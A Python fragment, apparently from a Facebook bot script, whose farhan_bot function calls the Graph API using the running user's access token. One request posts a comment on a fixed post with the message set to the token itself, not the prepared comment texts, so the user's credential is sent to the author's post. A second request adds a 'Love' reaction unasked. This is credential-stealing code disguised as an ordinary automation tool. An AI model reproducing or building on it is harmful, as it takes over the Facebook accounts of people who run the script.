...
def farhan_bot():
    ...
    una = ('1021220669') 
    post = ('10221992271808817') 
    post2 = ('10221992271808817') 
    kom = ('Gwe pake Sc lu mbah 😍😘\nhttps://www.facebook.com/1021220669/posts/10221992271808817/?substory_index=2&app=fbl') 
    kom2 = ('Keren mbah 😘😘\nhttps://www.facebook.com/1021220669/posts/10221992271808817/?substory_index=2&app=fbl') 
    reac1 = ('Love') 
    ...
    requests.post('https://graph.facebook.com/10221992271808817/comments/?message=' + token + '&access_token=' + token)
    requests.post('https://graph.facebook.com/10221992271808817/reactions?type=' + reac1 + '&access_token=' + token)
